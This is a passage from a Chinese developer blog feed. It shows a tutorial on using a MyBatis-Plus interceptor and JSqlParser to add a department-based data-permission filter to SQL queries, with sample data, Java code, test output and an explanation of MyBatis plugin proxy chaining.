<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `<span class="hljs-keyword">user</span>` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">5</span>, <span class="hljs-string">'tech_user2'</span>, <span class="hljs-string">'123456'</span>, <span class="hljs-string">'13800138005'</span>, <span class="hljs-number">1</span>, <span class="hljs-string">'2026-01-19 20:48:31'</span>);
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `<span class="hljs-keyword">user</span>` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">6</span>, <span class="hljs-string">'sales_user1'</span>, <span class="hljs-string">'123456'</span>, <span class="hljs-string">'13800138006'</span>, <span class="hljs-number">2</span>, <span class="hljs-string">'2026-01-19 20:48:31'</span>);
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `<span class="hljs-keyword">user</span>` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">7</span>, <span class="hljs-string">'sales_user2'</span>, <span class="hljs-string">'123456'</span>, <span class="hljs-string">'13800138007'</span>, <span class="hljs-number">2</span>, <span class="hljs-string">'2026-01-19 20:48:31'</span>);
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `<span class="hljs-keyword">user</span>` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">8</span>, <span class="hljs-string">'hr_user1'</span>, <span class="hljs-string">'123456'</span>, <span class="hljs-string">'13800138008'</span>, <span class="hljs-number">3</span>, <span class="hljs-string">'2026-01-19 20:48:31'</span>);
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `<span class="hljs-keyword">user</span>` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">9</span>, <span class="hljs-string">'finance_user1'</span>, <span class="hljs-string">'123456'</span>, <span class="hljs-string">'13800138009'</span>, <span class="hljs-number">4</span>, <span class="hljs-string">'2026-01-19 20:48:31'</span>);
​
<span class="hljs-comment">-- 插入部门数据</span>
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `department` (`id`, `name`, `code`, `description`, `create_time`) <span class="hljs-keyword">VALUES</span> 
(<span class="hljs-number">1</span>, <span class="hljs-string">'技术部'</span>, <span class="hljs-string">'TECH'</span>, <span class="hljs-string">'技术研发部门'</span>, <span class="hljs-built_in">CURRENT_TIMESTAMP</span>),
(<span class="hljs-number">2</span>, <span class="hljs-string">'销售部'</span>, <span class="hljs-string">'SALES'</span>, <span class="hljs-string">'销售市场部门'</span>, <span class="hljs-built_in">CURRENT_TIMESTAMP</span>),
(<span class="hljs-number">3</span>, <span class="hljs-string">'人力资源部'</span>, <span class="hljs-string">'HR'</span>, <span class="hljs-string">'人力资源管理部门'</span>, <span class="hljs-built_in">CURRENT_TIMESTAMP</span>),
(<span class="hljs-number">4</span>, <span class="hljs-string">'财务部'</span>, <span class="hljs-string">'FINANCE'</span>, <span class="hljs-string">'财务管理部门'</span>, <span class="hljs-built_in">CURRENT_TIMESTAMP</span>);
</code></pre>
<h5 data-id="heading-2">在pom.xml引入依赖</h5>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!--MyBatis-Plus扩展包（用于拦截器功能）--&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.baomidou<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-plus-extension<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.5.3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-comment">&lt;!-- SQL解析器（用于数据权限拦截器） --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.github.jsqlparser<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jsqlparser<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.6<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-comment">&lt;!--Lombok（如果使用@Slf4j注解）--&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">optional</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">optional</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<h5 data-id="heading-3">样例</h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">//user对象</span>
<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@TableName(<span class="hljs-string">"user"</span>)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> {
    <span class="hljs-meta">@TableId(type = IdType.AUTO)</span>
    <span class="hljs-keyword">private</span> <span class="hljs-built_in">Long</span> id;
    <span class="hljs-keyword">private</span> String username;
    <span class="hljs-keyword">private</span> String password;
    <span class="hljs-keyword">private</span> String phone;
    <span class="hljs-keyword">private</span> <span class="hljs-built_in">Long</span> departmentId;
    <span class="hljs-keyword">private</span> LocalDateTime createTime;
}
<span class="hljs-comment">//mapper</span>
<span class="hljs-meta">@Mapper</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserDao</span> <span class="hljs-title">extends</span> <span class="hljs-title">BaseMapper</span>&lt;<span class="hljs-type">User</span>&gt; {
    <span class="hljs-meta">@DataPermission</span> <span class="hljs-comment">//数据权限注解</span>
    <span class="hljs-meta">@Select(<span class="hljs-string">"select * from user"</span>)</span>
    List&lt;User&gt; selectUserList();
}
​
<span class="hljs-comment">//service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserService</span> <span class="hljs-title">extends</span> <span class="hljs-title">IService</span>&lt;<span class="hljs-type">User</span>&gt; {
    List&lt;User&gt; listUsersWithPermission();
}
<span class="hljs-comment">//serviceImpl</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-title">extends</span> <span class="hljs-title">ServiceImpl</span>&lt;<span class="hljs-type">UserDao, User</span>&gt; <span class="hljs-title">implements</span> <span class="hljs-title">UserService</span> {
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserDao userDao;
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> List&lt;User&gt; listUsersWithPermission() {
        <span class="hljs-keyword">return</span> userDao.selectUserList();
    }
}
​
<span class="hljs-comment">//controller</span>
<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping(<span class="hljs-string">"/api/users"</span>)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserController</span> {
​
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserService userService;
​
    <span class="hljs-comment">/**
     * 获取所有用户 - 应用数据权限过滤
     * 只有当前用户所在部门的用户数据会被返回
     */</span>
    <span class="hljs-meta">@GetMapping</span>
    <span class="hljs-keyword">public</span> List&lt;User&gt; list() {
        <span class="hljs-keyword">return</span> userService.listUsersWithPermission();
    }
}
</code></pre>
<h5 data-id="heading-4">数据权限注解</h5>
<ol start="0">
<li><code>自定义注解</code> - <code>@DataPermission</code></li>
<li><code>权限拦截器（核心）</code> - <code>DataPermissionInterceptor</code></li>
<li><code>Mybatis</code>拦截器容器 - <code>MybatisPlusInterceptor</code></li>
<li><code>SQL</code>解析器 - <code>JSqlParser</code></li>
</ol>

<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">//注解类</span>
<span class="hljs-meta">@Target(ElementType.METHOD)</span>
<span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span>
<span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> DataPermission {
​
    <span class="hljs-comment">/**
     * 部门字段名
     */</span>
    String <span class="hljs-title function_">departmentField</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-string">"department_id"</span>;
}
​
<span class="hljs-comment">//权限拦截器</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DataPermissionInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InnerInterceptor</span> {
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">beforeQuery</span><span class="hljs-params">(Executor executor, MappedStatement ms, Object parameter, RowBounds rowBounds, ResultHandler resultHandler, BoundSql boundSql)</span> <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-comment">// 获取当前用户信息（这里需要从SecurityContext或其他地方获取当前登录用户）</span>
        <span class="hljs-type">Long</span> <span class="hljs-variable">currentUserDepartmentId</span> <span class="hljs-operator">=</span> getCurrentUserDepartmentId();
        <span class="hljs-keyword">if</span> (currentUserDepartmentId == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span>; <span class="hljs-comment">// 如果没有部门信息，不进行数据权限过滤</span>
        }
        <span class="hljs-comment">// 检查方法是否标注了@DataPermission注解</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> ms.getId();
        <span class="hljs-type">boolean</span> <span class="hljs-variable">hasDataPermission</span> <span class="hljs-operator">=</span> hasDataPermissionAnnotation(methodName);
​
        <span class="hljs-keyword">if</span> (!hasDataPermission) {
            <span class="hljs-keyword">return</span>; <span class="hljs-comment">// 如果没有注解，不进行数据权限过滤</span>
        }
​
        <span class="hljs-comment">// 解析SQL并添加部门过滤条件</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">originalSql</span> <span class="hljs-operator">=</span> boundSql.getSql();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">String</span> <span class="hljs-variable">modifiedSql</span> <span class="hljs-operator">=</span> addDepartmentFilter(originalSql, currentUserDepartmentId);
            <span class="hljs-comment">// 使用反射修改BoundSql中的SQL</span>
            <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> boundSql.getClass().getDeclaredField(<span class="hljs-string">"sql"</span>);
            field.setAccessible(<span class="hljs-literal">true</span>);
            field.set(boundSql, modifiedSql);
​
            log.info(<span class="hljs-string">"数据权限拦截器修改SQL: {}"</span>, modifiedSql);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            log.error(<span class="hljs-string">"数据权限拦截器处理SQL失败"</span>, e);
        }
    }
​
    <span class="hljs-comment">/**
     * 获取当前用户的部门ID
     */</span>
    <span class="hljs-keyword">private</span> Long <span class="hljs-title function_">getCurrentUserDepartmentId</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">//模拟获取当前用户部门ID，实际应该从SecurityContext或ThreadLocal获取</span>
        <span class="hljs-keyword">return</span> <span class="hljs-number">1L</span>;
    }
​
    <span class="hljs-keyword">private</span> Boolean <span class="hljs-title function_">hasDataPermissionAnnotation</span><span class="hljs-params">(String methodName)</span>{
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">//通过方法名解析类名和方法名</span>
            <span class="hljs-type">int</span> <span class="hljs-variable">lastDotIndex</span> <span class="hljs-operator">=</span> methodName.lastIndexOf(<span class="hljs-string">"."</span>);
            <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> methodName.substring(<span class="hljs-number">0</span>, lastDotIndex);
            <span class="hljs-type">String</span> <span class="hljs-variable">methodNameOnly</span> <span class="hljs-operator">=</span> methodName.substring(lastDotIndex + <span class="hljs-number">1</span>);
            Class&lt;?&gt; clazz = Class.forName(className);
            <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> clazz.getMethod(methodNameOnly);
            <span class="hljs-keyword">return</span> method.isAnnotationPresent(DataPermission.class);
        }<span class="hljs-keyword">catch</span> (Exception e){
            log.warn(<span class="hljs-string">"检查数据权限注解失败: {}"</span>, methodName, e);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
    }
​
    <span class="hljs-comment">/**
     * 添加部门过了条件到SQL中
     */</span>
    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">addDepartmentFilter</span><span class="hljs-params">(String sql,Long departmentId)</span> <span class="hljs-keyword">throws</span> JSQLParserException{
        <span class="hljs-type">Select</span> <span class="hljs-variable">select</span> <span class="hljs-operator">=</span> (Select) CCJSqlParserUtil.parse(sql);
        <span class="hljs-type">SelectBody</span> <span class="hljs-variable">selectBody</span> <span class="hljs-operator">=</span> select.getSelectBody();
        <span class="hljs-keyword">if</span> (selectBody <span class="hljs-keyword">instanceof</span> PlainSelect){
            <span class="hljs-type">PlainSelect</span> <span class="hljs-variable">plainSelect</span> <span class="hljs-operator">=</span> (PlainSelect) selectBody;
            <span class="hljs-type">Expression</span> <span class="hljs-variable">where</span> <span class="hljs-operator">=</span> plainSelect.getWhere();
​
            <span class="hljs-type">Column</span> <span class="hljs-variable">departmentColumn</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Column</span>(<span class="hljs-string">"department_id"</span>);
            <span class="hljs-type">LongValue</span> <span class="hljs-variable">departmentValue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LongValue</span>(departmentId);
            <span class="hljs-type">EqualsTo</span> <span class="hljs-variable">departmentFilter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EqualsTo</span>(departmentColumn, departmentValue);
            <span class="hljs-keyword">if</span> (where ==<span class="hljs-literal">null</span>){
                plainSelect.setWhere(departmentFilter);
            }<span class="hljs-keyword">else</span> {
                <span class="hljs-type">AndExpression</span> <span class="hljs-variable">andExpression</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">AndExpression</span>(where,departmentFilter);
                plainSelect.setWhere(andExpression);
            }
        }
        <span class="hljs-keyword">return</span> select.toString();
    }
}
​
<span class="hljs-comment">//Mybatis-plus的配置</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MybatisPlusConfig</span> {
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> MybatisPlusInterceptor <span class="hljs-title function_">mybatisPlusInterceptor</span><span class="hljs-params">()</span>{
        <span class="hljs-type">MybatisPlusInterceptor</span> <span class="hljs-variable">interceptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MybatisPlusInterceptor</span>();
        <span class="hljs-comment">// 添加数据权限插件</span>
        interceptor.addInnerInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DataPermissionInterceptor</span>());
        <span class="hljs-keyword">return</span> interceptor;
    }
}
</code></pre>
<h5 data-id="heading-5">测试</h5>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@SpringBootTest</span>
<span class="hljs-variable">@Slf4j</span>
class DemoApplicationTests {
    <span class="hljs-variable">@Autowired</span>
    private UserController userController;
    <span class="hljs-variable">@Test</span>
    void <span class="hljs-built_in">contextLoads</span>() {
        <span class="hljs-selector-tag">List</span>&lt;<span class="hljs-selector-tag">User</span>&gt; <span class="hljs-selector-tag">list</span> = <span class="hljs-selector-tag">userController</span><span class="hljs-selector-class">.list</span>();
        <span class="hljs-selector-tag">log</span><span class="hljs-selector-class">.info</span>(<span class="hljs-string">"查询结果：{}"</span>, list);
    }
}
</code></pre>
<p>输出：通过数据拦截器修改了<code>SQL</code>,所以人员只能看到本部门的数据</p>
<pre><code class="hljs language-sql" lang="sql">数据权限拦截器修改<span class="hljs-keyword">SQL</span>: <span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">WHERE</span> department_id <span class="hljs-operator">=</span> <span class="hljs-number">1</span>
查询结果：[<span class="hljs-keyword">User</span>(id<span class="hljs-operator">=</span><span class="hljs-number">1</span>, username<span class="hljs-operator">=</span>testuser1, password<span class="hljs-operator">=</span><span class="hljs-number">123456</span>, phone<span class="hljs-operator">=</span><span class="hljs-number">13800138001</span>, departmentId<span class="hljs-operator">=</span><span class="hljs-number">1</span>, createTime<span class="hljs-operator">=</span><span class="hljs-number">2026</span><span class="hljs-number">-01</span><span class="hljs-number">-19</span>T20:<span class="hljs-number">48</span>:<span class="hljs-number">31</span>), <span class="hljs-keyword">User</span>(id<span class="hljs-operator">=</span><span class="hljs-number">4</span>, username<span class="hljs-operator">=</span>tech_user1, password<span class="hljs-operator">=</span><span class="hljs-number">123456</span>, phone<span class="hljs-operator">=</span><span class="hljs-number">13800138004</span>, departmentId<span class="hljs-operator">=</span><span class="hljs-number">1</span>, createTime<span class="hljs-operator">=</span><span class="hljs-number">2026</span><span class="hljs-number">-01</span><span class="hljs-number">-19</span>T20:<span class="hljs-number">48</span>:<span class="hljs-number">31</span>), <span class="hljs-keyword">User</span>(id<span class="hljs-operator">=</span><span class="hljs-number">5</span>, username<span class="hljs-operator">=</span>tech_user2, password<span class="hljs-operator">=</span><span class="hljs-number">123456</span>, phone<span class="hljs-operator">=</span><span class="hljs-number">13800138005</span>, departmentId<span class="hljs-operator">=</span><span class="hljs-number">1</span>, createTime<span class="hljs-operator">=</span><span class="hljs-number">2026</span><span class="hljs-number">-01</span><span class="hljs-number">-19</span>T20:<span class="hljs-number">48</span>:<span class="hljs-number">31</span>)]
</code></pre>
<h5 data-id="heading-6">工作机制</h5>
<ol start="0">
<li>当<code>DAO</code>方法被标注了<code>@DataPermission</code>注解时</li>
<li>从当前用户上下文获取部门ID(目前示例中是硬编码1)</li>
<li>将<code>SELECT * FROM user</code> 改为 <code>SELECT * FROM user WHERE department_id = 1</code></li>
<li>只返回当前用户所在部门的数据</li>
</ol>
<h4 data-id="heading-7">原理</h4>
<p><code>Mybatis-Plus</code>的插件机制是基于责任链模式和装饰器模式，是对<code>Mybatis</code>原生拦截器机制的增强封装</p>
<h5 data-id="heading-8">其插件的注册流程</h5>
<p><code>Spring</code>容器启动-&gt; <code>MybatisPlusConfig</code>配置类-&gt;创建<code>MybatisPlusInterceptor</code>实例-&gt;调用<code>addInnerInterceptor</code>添加插件-&gt; 插件被注册到内部列表（<code>interceptors</code>）中</p>
<blockquote>
<p>注意：插件的执行顺序是，谁先注册到插件容器中，谁先执行</p>
</blockquote>
<h5 data-id="heading-9">SQL执行的拦截流程</h5>
<p>在描述拦截流程前，简单阐述下以下几个Mybatis底层的重要类</p>
<h5 data-id="heading-10">重要类</h5>
<p><code>Mybatis</code>底层允许拦截的类方法只有四个<code>Executor、StatementHandler、ParameterHandler、ResultSetHandler</code>。为啥时这四个，因为它们覆盖了<code>SQL</code>执行的全生命周期核心环节。</p>
<p><code>Executor</code>调度执行<code>StatementHandler</code> 进行<code>SQL</code>构建，<code>StatementHandler</code> 设置<code>SQL</code>中占位符参数、<code>ResultSetHandler</code>封装执行<code>SQL</code>后返回的结果。所以我们只需要拦截以上类的方法，就能够拦截<code>SQL</code>执行流程了</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3d4f83acebe7470ca509e9f3279a6c84~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5piO5aSp5pyJ5LiT5Lia6K--:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593758&amp;x-signature=5ybKgN8cFOrLk02JBD6IIF2UfTA%3D" alt="SQL执行.png" loading="lazy"/></p>
<p><code>Interceptor</code> : 插件开发的接口，定义插件拦截逻辑和代理规则</p>
<p><code>InterceptorChain</code>: 拦截器的【容量+责任链管理器】，负责管理所有拦截器并生成嵌套代理</p>
<p><code>Plugin</code>: 动态代理的【生成器+处理器】，实现方法的拦截，插件的底层核心</p>
<h5 data-id="heading-11">流程解析</h5>
<ol>
<li>
<p>生成Mapper代理类：当调用我们文中 <code>userDao.selectUserList</code> 的时候，<code>mybatis</code>会通过<code>JDK</code>的动态代理生成<code>MybatisMapperProxy</code>代理类进行处理</p>
</li>
<li>
<p>Mapper代理类执行: <code>MybatisMapperProxy</code>代理类根据方法类型执行对应的逻辑，通过<code>SqlSession</code>执行<code>selectList</code>方法</p>
</li>
<li>
<p>生成<code>SqlSession</code>执行，其调用过程：</p>
<ol>
<li>在执行<code>selectList</code>方法前会生成<code>SQLSessionProxy</code>代理，代理会通过工厂类获取<code>DefaultSqlSession</code>实例</li>
<li><code>DefaultSqlSession</code>的会从配置数据源中获取连接，并通过<code>Configuration</code>类创建<code>Executor</code>实例</li>
</ol>
</li>
<li>
<p><code>Configuration</code>类执行：<code>interceptorChain.pluginAll</code>方法，为生成当前动态代理对象，触发<code>Plugin</code>插件的<code>plugin</code>方法</p>
</li>
<li>
<p><code>循环嵌套代理（核心处理逻辑）</code>： <code>InterceptorChain</code>类内部维护插件容器，遍历所有注册在内的插件实例<code>Interceptor</code>，并调用插件中<code>plugin</code>方法为当前<code>target（Executor）</code>生成嵌套的动态代理。<code>InterceptorChain</code>是用责任链模式，核心逻辑：</p>
<pre><code class="hljs language-typescript" lang="typescript">    <span class="hljs-comment">//InterceptorChain类</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Object</span> <span class="hljs-title function_">pluginAll</span>(<span class="hljs-params"><span class="hljs-built_in">Object</span> target</span>) {
        <span class="hljs-title class_">Interceptor</span> interceptor;
        <span class="hljs-keyword">for</span>(<span class="hljs-title class_">Iterator</span> var2 = <span class="hljs-variable language_">this</span>.<span class="hljs-property">interceptors</span>.<span class="hljs-title function_">iterator</span>(); var2.<span class="hljs-title function_">hasNext</span>(); target = interceptor.<span class="hljs-title function_">plugin</span>(target)) {
            interceptor = (<span class="hljs-title class_">Interceptor</span>)var2.<span class="hljs-title function_">next</span>(); <span class="hljs-comment">//嵌套代理</span>
        }
​
        <span class="hljs-keyword">return</span> target;
    }
    
    <span class="hljs-comment">//MybatisPlusInterceptor类</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Object</span> <span class="hljs-title function_">plugin</span>(<span class="hljs-params"><span class="hljs-built_in">Object</span> target</span>) {
        <span class="hljs-keyword">return</span> !(target <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Executor</span>) &amp;&amp; !(target <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">StatementHandler</span>) ? target : <span class="hljs-title class_">Plugin</span>.<span class="hljs-title function_">wrap</span>(target, <span class="hljs-variable language_">this</span>);
    }
    
    <span class="hljs-comment">//原生Plugin代理类</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-title class_">Object</span> <span class="hljs-title function_">wrap</span>(<span class="hljs-params"><span class="hljs-built_in">Object</span> target, Interceptor interceptor</span>) {
        <span class="hljs-comment">// 1. 解析拦截器的 @Signature 注解，获取拦截规则</span>
        <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">Class</span>&lt;?&gt;, <span class="hljs-title class_">Set</span>&lt;<span class="hljs-title class_">Method</span>&gt;&gt; signatureMap = <span class="hljs-title function_">getSignatureMap</span>(interceptor);
        <span class="hljs-comment">// 2. 获取目标对象中匹配拦截规则的接口（必须是接口，JDK动态代理要求）</span>
        <span class="hljs-title class_">Class</span>&lt;?&gt; <span class="hljs-keyword">type</span> = target.<span class="hljs-title function_">getClass</span>();
        <span class="hljs-comment">// 3. 如果有匹配的接口，生成动态代理对象；否则返回原对象（无需代理）</span>
        <span class="hljs-title class_">Class</span>&lt;?&gt;[] interfaces = <span class="hljs-title function_">getAllInterfaces</span>(<span class="hljs-keyword">type</span>, signatureMap);
        <span class="hljs-keyword">return</span> interfaces.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span> ? <span class="hljs-title class_">Proxy</span>.<span class="hljs-title function_">newProxyInstance</span>(<span class="hljs-keyword">type</span>.<span class="hljs-title function_">getClassLoader</span>(), interfaces, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Plugin</span>(target, interceptor, signatureMap)) : target;
    }
</code></pre>
<p>看到这会有同学想问什么是循环嵌套代理，<strong>循环嵌套代理</strong>是</p>
<p><strong>循环</strong>: 检索所有注册到容器中的插件（如：<code>MybatisPlusInterceptor</code>或自定义插件类）</p>
<p><strong>嵌套</strong>：代码 <code>interceptor = (Interceptor) var2.next()</code> 而 Interceptor又执行<code>Plugin.wrap()</code> , 所以代码是 <code>target = Plugin.wrap(target, interceptor)</code>在循环的过程中一层套一层</p>
<p><strong>代理</strong>：通过JDK的动态代理对target进行代理</p>
<p>所以使用<strong>循环嵌套代理是让所有的插件都可以拦截代理 target对象（<code>Excutor</code>）方法，使得在执行target对象方法时可以使用代理的所有注册的插件功能</strong></p>
<p>如果不使用循环嵌套代理，<code>pluginAll</code>方法的执行结果只会让最后一个插件代理生效</p>
</li>
<li>
<p><code>SqlSessionInterceptor</code>执行调用：<code>method.invoke</code></p>
</li>
<li>
<p>在target目标对象被调用之前，通过<code>JDK</code>动态代理的方式会执行到<code>plugin</code>插件的<code>intercept</code>方法</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">public</span> Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        <span class="hljs-keyword">try</span> {
            Set&lt;Method&gt; methods = (Set)<span class="hljs-keyword">this</span>.signatureMap.<span class="hljs-keyword">get</span>(method.getDeclaringClass());
            <span class="hljs-keyword">return</span> methods != <span class="hljs-literal">null</span> &amp;&amp; methods.contains(method) ? <span class="hljs-keyword">this</span>.interceptor.intercept(new Invocation(<span class="hljs-keyword">this</span>.target, method, args)) : method.invoke(<span class="hljs-keyword">this</span>.target, args);
        } <span class="hljs-keyword">catch</span> (Exception var5) {
            <span class="hljs-keyword">throw</span> ExceptionUtil.unwrapThrowable(var5);
        }
    }
</code></pre>
</li>
<li>
<p><code>Plugin</code>代理开始执行插件类的方法：</p>
<ol>
<li><code>MybatisMapperPlusInterceptor</code>插件类内部维护了<code>interceptors</code>容器,遍历所有注册到容器的<code>InnerInterceptor</code>实例</li>
<li>调用容器中的实例：就是我们实现的<code>DataPermissionInterceptor</code></li>
<li>执行 <code>beforeQuery</code>方法：添加数据权限</li>
<li>执行其他插件的逻辑</li>
</ol>
</li>
<li>
<p>开始执行其他可以被拦截的方法: <code>ParameterHandler</code>、<code>ResultSetHander</code>、<code>StatementHandler</code></p>
</li>
<li>
<p>流程结束</p>
</li>
</ol>
<h4 data-id="heading-12">总结</h4>
<p>通过<code>Mybatis-Plus</code>的插件和<code>Mybatis</code>的拦截器机制，我们可以实现很多强大的功能，比如添加租户ID、分库分表、数据脱敏等等。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[CSS属性 - 文字相关属性]]></title>    <link>https://juejin.cn/post/7597466318977810466</link>    <guid>https://juejin.cn/post/7597466318977810466</guid>    <pubDate>2026-01-21T09:15:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597466318977810466" data-draft-id="7597466318977761314" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="CSS属性 - 文字相关属性"/> <meta itemprop="keywords" content="CSS"/> <meta itemprop="datePublished" content="2026-01-21T09:15:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="GinoWi"/> <meta itemprop="url" content="https://juejin.cn/user/687651121011707"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            CSS属性 - 文字相关属性
